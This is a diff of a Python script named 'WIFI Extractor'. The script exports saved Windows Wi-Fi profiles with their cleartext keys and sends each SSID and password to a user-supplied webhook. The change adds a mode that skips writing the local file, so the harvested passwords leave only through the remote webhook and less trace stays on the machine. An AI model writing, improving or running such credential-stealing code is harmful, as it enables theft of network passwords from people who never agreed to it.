@@ -21,21 +21,21 @@ def main(url, only_webhook, version):
         print('\nWIFI Extractor\n\nVersion 1.0\n')
         exit()
     elif url != '' and only_webhook == True:
-        extractor()
-        os.remove('Extracciones.txt')
+        extractor(only_webhook)
         urlweb(url)
         
     elif url != '' and only_webhook == False:
-        extractor()
+        extractor(only_webhook)
         urlweb(url)
     else:
-        extractor()
+        extractor(only_webhook)
         print('\nDone! \n\nHecho!\n')
 
 #hara el proceso de extraccion
-def extractor():
+def extractor(only_webhook):
     #crea el archivo txt
-    txt = open("Extracciones.txt", "w")
+    if only_webhook == False:
+        txt = open("Extracciones.txt", "w")
 
     #corre el comando en la command prompt
     cmd = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()
@@ -60,12 +60,18 @@ def extractor():
         contrasena = rt[4][0][1][2].text
         ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
         WIFIs.append(ssid_contrasena)
-        txt.write(WIFIs[conta]+"\n")
+        try:
+            txt.write(WIFIs[conta]+"\n")
+        except:
+            pass
         conta = conta + 1
         os.remove(archivo)
 
-    #ciera el archivo txt
-    txt.close()
+    try: 
+        #cierra el archivo txt
+        txt.close()
+    except:
+        pass
 
 #envia a la url de webhook si se especifica con la opcion -u
 def urlweb(url):
@@ -79,10 +85,7 @@ def urlweb(url):
         print('\nDone! \n\nHecho!\n')
     except:
         print('\nError could not send: url not specified or invalid url | url no especificada o es invalida\n')
-        try:
-            os.remove('Extracciones.txt')
-        except:
-            exit()
+        exit()
 
 if __name__ == '__main__':
     main()
